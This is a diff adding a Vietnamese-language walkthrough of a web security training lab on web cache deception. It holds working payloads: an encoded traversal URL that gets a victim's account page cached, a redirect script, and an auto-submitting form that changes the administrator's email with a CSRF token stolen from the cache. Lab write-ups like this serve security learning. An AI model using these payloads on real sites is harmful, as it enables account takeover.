@@ -147,3 +147,37 @@ Truy cap de lay thong tin của cache nan nhan
 **Note**
 
 
+### Exploiting normalization by the cache server
+#### 5. Lab: Exploiting exact-match cache rules for web cache deception
+**Yêu cầu**
+To solve the lab, change the email address for the user `administrator`. You can log in to your own account using the following credentials: `wiener:peter`.
+
+**Thực hiện**
+Bai nay, cache chi luu cac file co dinh như `favicon.ico`. De trigger lo hong web cache. Truoc tien ta can Detecting Normalization By the Cache Server
+![alt text](image-28.png)
+![alt text](image-29.png)
+![alt text](image-30.png)
+-> `abc%2f%2e%2e%2ffavicon.ico`. Server không chuẩn hóa còn Cache chuẩn hóa được.
+-> Tức đã là phần url trên đã được lưu cache.
+
+`GET my-account%2f%2e%2e%2ffavicon`. Tìm kiếm delimiter để có thể truy cập được `/my-account` nhưng cache server lại lưu vào cache. Kí tự delimiter phù hợp `;`
+![alt text](image-31.png)
+
+Tạo payload để lấy thông tin admin
+`<script>document.location="https://0a6400de030e97768593d28100420015.web-security-academy.net/my-account;%2f%2e%2e%2ffavicon.ico"</script>`
+
+Truoc khi cache het han ta lay duoc thong tin admin
+![alt text](image-32.png)
+
+De thay đoi email cua nan nhan ta can ta 1 payload nhu sau
+```
+<form class="testForm" name="change-email-form" action="https://0aae002f0480e270c92ee04100ba0094.web-security-academy.net/my-account/change-email" method="POST">
+    <input  type="email" name="email" value="hacker@gmail.com">
+    <input  type="hidden" name="csrf" value="YbnCi4v5rgT6emKpFjhhwGr7ygWfWNCv">
+</form>
+<script>
+  document.querySelector('.testForm').submit();
+</script>
+```
+luu y ma csrf ta lay duoc thong qua phan hoi cache duoc luu lai cua administrator
+**Note**
